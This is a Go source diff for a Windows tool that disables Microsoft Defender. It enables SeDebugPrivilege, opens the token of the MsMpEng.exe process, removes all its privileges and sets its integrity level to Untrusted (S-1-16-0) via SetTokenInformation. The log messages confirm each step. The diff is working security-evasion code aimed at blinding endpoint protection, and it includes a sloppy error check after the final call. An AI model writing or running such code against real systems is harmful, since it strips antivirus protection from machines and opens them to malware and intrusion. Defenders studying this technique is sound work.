@@ -28,6 +28,12 @@ const (
 	SE_SHUTDOWN_NAME               = "SeShutdownPrivilege"
 	SE_ASSIGNPRIMARYTOKEN_NAME     = "SeAssignPrimaryTokenPrivilege"
 	SE_PRIVILEGE_REMOVED            = 0X00000004
+
+)
+
+var(
+	modadvapi32             = windows.NewLazySystemDLL("advapi32.dll")
+	procSetTokenInformation = modadvapi32.NewProc("SetTokenInformation")
 )
 
 type WindowsProcess struct {
@@ -93,6 +99,43 @@ func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess 
 	return nil
 }
 
+func EnableDebugPrivilege(){
+	var hToken windows.Token
+	//handle, err := windows.GetCurrentProcess()
+	handle := windows.CurrentProcess()
+	defer windows.CloseHandle(handle)
+	err := windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &hToken)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer hToken.Close()
+	// Check the LUID
+	var sedebugnameValue windows.LUID
+	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
+	if err != nil {
+		fmt.Println(err)
+	}
+	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &sedebugnameValue)
+	if err != nil {
+		log.Fatal(err)
+	}
+	// Modify the token
+	var tkp windows.Tokenprivileges
+	tkp.PrivilegeCount = 1
+	tkp.Privileges[0].Luid = sedebugnameValue
+	tkp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
+
+	// Adjust token privs
+	tokPrivLen := uint32(unsafe.Sizeof(tkp))
+	log.Println(fmt.Sprintf("[+] Current token length is: %d", tokPrivLen))
+	err = windows.AdjustTokenPrivileges(hToken, false, &tkp, tokPrivLen, nil, nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Println("[+] Debug Priviledge granted!")
+
+}
+
 func SetPrivilege(hToken windows.Token,lpszPrivilege *uint16,bEnablePrivilege bool)(PanDan bool){
 	//var hToken syscall.Token
 	var tp windows.Tokenprivileges
@@ -114,18 +157,29 @@ func SetPrivilege(hToken windows.Token,lpszPrivilege *uint16,bEnablePrivilege bo
 	tokenPrivLen := uint32(unsafe.Sizeof(tokenPriviledge))
 	err = windows.AdjustTokenPrivileges(hToken, false, &tp, tokenPrivLen, nil, nil)
 	if err != nil {
-		log.Fatal(err)				
+		log.Fatal(err)				//GetLastError()
 		return false
 	}else{
 		return true
 	}
 }
 
+func SetTokenInformation(token windows.Token, infoClass uint32, info uintptr, infoLen uint32)(err error){
+	r1, _, err := syscall.Syscall6(procSetTokenInformation.Addr(), 4, uintptr(token), uintptr(infoClass), info, uintptr(infoLen), 0, 0)
+	if r1 == 0 {
+		return err
+	}
+	return
+}
+
+
 func main() {
+	EnableDebugPrivilege()
 	parentName := "MsMpEng.exe"
 	procS, _ := Processes()
 	ParentInfo := FindProcessByName(procS, parentName) 
 	if ParentInfo != nil {
+
 		pid := uint32(ParentInfo.ProcessID)	
 		fmt.Println(pid)
 		const ProcessQueryInformation = windows.PROCESS_QUERY_LIMITED_INFORMATION
@@ -135,7 +189,7 @@ func main() {
 			log.Fatal(err)
 		}
 		fmt.Println(reflect.TypeOf(pHandle))
-		//uintpHandle := uintptr(pHandle)
+
 		var ptoken windows.Token
 
 		err = windows.OpenProcessToken(pHandle, windows.TOKEN_ALL_ACCESS, &ptoken)
@@ -145,15 +199,15 @@ func main() {
 
 		privStr, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
 
-		var luid windows.LUID
-		err = windows.LookupPrivilegeValue(nil,privStr,&luid)
+		var sedebugnameValue windows.LUID
+		err = windows.LookupPrivilegeValue(nil,privStr,&sedebugnameValue)
 		if err != nil {
 			log.Fatal(err)
 		}
 
 		var tokenPriviledges windows.Tokenprivileges
 		tokenPriviledges.PrivilegeCount = 1
-		tokenPriviledges.Privileges[0].Luid = luid
+		tokenPriviledges.Privileges[0].Luid = sedebugnameValue
 		tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
 
 		// Adjust token privs
@@ -195,5 +249,27 @@ func main() {
 
 		fmt.Println("[*] Removed All Privileges")
 
+		tml := &windows.Tokenmandatorylabel{}
+		tml.Label.Attributes = windows.SE_GROUP_INTEGRITY
+
+		untrustedSid, err := syscall.UTF16PtrFromString("S-1-16-0")
+		if err != nil {
+			log.Fatal(err)
+		}
+		//log.Println("[+] Created UTF16 pointer from string S-1-16-0")
+
+		err = windows.ConvertStringSidToSid(untrustedSid, &tml.Label.Sid)
+		if err != nil {
+			log.Fatal(err)
+		}
+		log.Println("[+] Created untrusted SID")
+		SetTokenInformation(ptoken, windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(tml)), tml.Size())
+		if err != nil {
+			log.Fatal(err)
+		}
+		log.Println("[+] Set process token to untrusted!")
+
+		defer windows.CloseHandle(windows.Handle(ptoken))
+		defer windows.CloseHandle(pHandle)
 	}
 }
